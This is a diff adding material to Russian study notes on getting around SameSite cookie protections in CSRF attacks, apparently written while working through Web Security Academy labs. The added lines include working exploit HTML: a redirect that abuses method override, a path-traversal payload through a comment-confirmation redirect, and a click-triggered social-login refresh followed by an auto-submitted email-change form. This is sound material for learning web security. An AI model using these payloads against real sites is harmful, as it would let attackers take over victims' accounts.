@@ -269,6 +269,16 @@ Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
 </form>
 ```
 
+```html
+<html>
+    <body>
+        <script> 
+            document.location = 'https://0a03007a03c6d6c3c081835000b300e9.web-security-academy.net/my-account/change-email?_method=POST&email=wiener%40normal-user.net';
+        </script>
+    </body>
+</html>
+```
+
 Другие фреймворки поддерживают множество подобных параметров.
 
 ### Обход ограничений SameSite с помощью гаджетов на сайте
@@ -282,12 +292,34 @@ Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
 
 Обратите внимание, что аналогичная атака невозможна при перенаправлении на стороне сервера. В этом случае браузеры признают, что запрос на следование перенаправлению изначально является результатом межсайтового запроса, поэтому они все равно применяют соответствующие ограничения cookie.
 
+Допустим, есть возможность сменить почту, есть возможность оставлять комментарии под постами. Когда постишь новый комментарий, редиректит на страницу с подтверждением, а в ней бэклинк к посту
+
+```html
+<script src='/resources/js/commentConfirmationRedirect.js'></script>
+<script>redirectOnConfirmation('/post');</script>
+<h1>Thank you for your comment!</h1>
+ <p>Your comment has been submitted. You will be redirected momentarily.</p>
+<div class="is-linkback">
+    <a href="/post/1">Back to blog</a>
+</div>
+```
+
+Эксплуатируем этот бэклинк:
+
+```html
+<script>
+	document.location = 'https://0a4f005a037b7db5c00690440080001e.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40evil-user.net%26submit=1'
+</script>
+```
+
 ### Обход ограничений SameSite с помощью уязвимых дочерних доменов
 Независимо от того, тестируете ли вы чужой сайт или пытаетесь защитить свой собственный, важно помнить, что запрос может быть односайтовым, даже если он отправлен через другой сайт.
 
 Убедитесь, что вы тщательно проверили всю доступную поверхность атаки, включая все дочерние домены. В частности, уязвимости, позволяющие вызвать произвольный вторичный запрос, такие как XSS, могут полностью скомпрометировать защиту сайта, открывая все домены сайта для межсайтовых атак.
 
-В дополнение к классическому CSRF, не забывайте, что если целевой сайт поддерживает WebSockets, эта функциональность может быть уязвима для межсайтового WebSocket hijacking (CSWSH), который по сути является просто CSRF атакой, направленной на WebSocket handshake. Для получения более подробной информации см. нашу тему об уязвимостях WebSocket.
+В дополнение к классическому CSRF, не забывайте, что если целевой сайт поддерживает WebSockets, эта функциональность может быть уязвима для межсайтового WebSocket hijacking (CSWSH), который по сути является просто CSRF атакой, направленной на WebSocket handshake.
+
+**To Do:** CRSF x WebSocket hijacking (https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
 
 ### Обход ограничений SameSite Lax с помощью недавно выпущенных файлов cookie
 SameSite cookie с ограничениями `Lax` обычно не отправляются в межсайтовых `POST`-запросах, но есть и исключения.
@@ -317,6 +349,30 @@ window.onclick = () => {
 ```
 
 Таким образом, метод `window.open()` будет вызываться только тогда, когда пользователь щелкнет где-нибудь на странице.
+
+Т.к. пользователь уже залогинен в условной соц. сети, при переходе на страницу SSO-логина вход в акк произойдет автоматически и через 10 секунд отправится `POST`-запрос на смену почты (согласен, полная хуйня для мамонтят):
+
+```html
+<script>
+    history.pushState('', '', '/')
+</script>
+
+<form method="POST" action="https://0ae7002204371499c1d88ab0008400a6.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwn3d111@evil-user.net">
+</form>
+
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://0ae7002204371499c1d88ab0008400a6.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 10000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```
 
 ## Referer-based валидация
 
